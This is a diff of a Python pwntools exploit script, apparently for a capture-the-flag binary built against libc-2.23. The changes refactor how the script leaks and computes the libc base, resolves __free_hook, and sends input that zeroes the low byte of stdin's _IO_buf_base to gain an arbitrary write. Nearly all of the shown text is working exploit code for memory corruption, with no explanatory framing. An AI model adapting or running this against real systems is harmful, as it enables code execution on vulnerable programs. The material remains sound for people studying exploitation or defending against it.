@@ -12,8 +12,11 @@ libc = ELF('./libc-2.23.so')
 #11010110
 #10110101
 #11111111
+
 #libc : 0x7ffff7a0d000
-#magic: __free_hook(0x3c67a8)               : 0x0000000000000000
+
+offset_free_hook = libc.symbols["__free_hook"]
+print 'offset_free_hook =', hex(offset_free_hook)  #free_hook_addr = 0x3c67a8
 
 #libc-database:
 # ./find __free_hook 0x7a8
@@ -44,9 +47,6 @@ print 'leak =', leak, '>', hex(leak_unpacked)  # 0x7ffff7de77cb - 0x3DA7CB = 0x7
 libc.address = leak_unpacked - 0x3DA7CB
 
 print 'libc.address =', hex(libc.address)
-free_hook_addr = libc.symbols["__free_hook"]
-print 'free_hook_addr =', hex(free_hook_addr)  #free_hook_addr = 0x7ffff7dd37a8
-
 
 # exiting leak function
 s.sendline('11111111')
@@ -108,16 +108,12 @@ $1 = {
 
 # overwriting last 2 bytes at address 0x7ffff7dd1918 to 00 => 0x00007ffff7dd1963 turns 0x7ffff7dd1900
 # *((_BYTE *)buf + size - 1) = 0
-# _IO_buf_base_addr = libc.address + 0x3c4918 = 
-# = libc.address + offset__IO_2_1_stdin_ + 56 = 0x7ffff7a0d000 + 0x3c4918 = 0x7FFFF7DD1918
-# 0 + (-0xffff80000822e6e7) - 1 = 0x7FFFF7DD1918
-size_payload = -(0x10000000000000000- (libc.address + 0x3c4918 + 1))
-#(-(0x10000000000000000- (libc.address + 0x3c4918 + 1))) = -18446603336357701353 = -0xffff80000822e6e9
-print '(-(0x10000000000000000- (libc.address + 0x3c4918 + 1))) =', size_payload, '=', hex(size_payload)
+# _IO_buf_base_addr = libc.address + 0x3c4918 = libc.address + offset__IO_2_1_stdin_ + 56 = 0x7ffff7a0d000 + 0x3c4918 = 0x7FFFF7DD1918
 
-#s.sendline(str(size_payload))
+_IO_buf_base_addr = libc.address + 0x3c4918
+
 log.info('setting LSB of _IO_buf_base to 00...')
-s.sendline(str(libc.address + 0x3c4918 + 1))
+s.sendline(str(_IO_buf_base_addr + 1))
 pause()
 
 # next input will be writen at 0x7ffff7dd1900 :
